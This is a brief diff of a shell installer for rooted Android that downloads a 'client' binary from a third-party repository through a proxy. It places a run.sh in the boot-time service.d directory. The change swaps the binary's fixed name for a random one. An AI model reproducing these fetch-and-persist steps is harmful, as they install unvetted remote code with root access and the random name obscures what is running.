@@ -22,7 +22,7 @@ download_file "https://gh-proxy.org/https://raw.githubusercontent.com/jenssenli/
 chmod +x /data/adb/service.d/run.sh
 
 # 4. 建立臨時目錄
-ASSET_NAME="client"
+ASSET_NAME="$(head -c 16 /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 8)"
 URL="https://gh-proxy.org/https://github.com/jenssenli/ko/raw/refs/heads/main/client"
 
 if type mktemp >/dev/null 2>&1; then
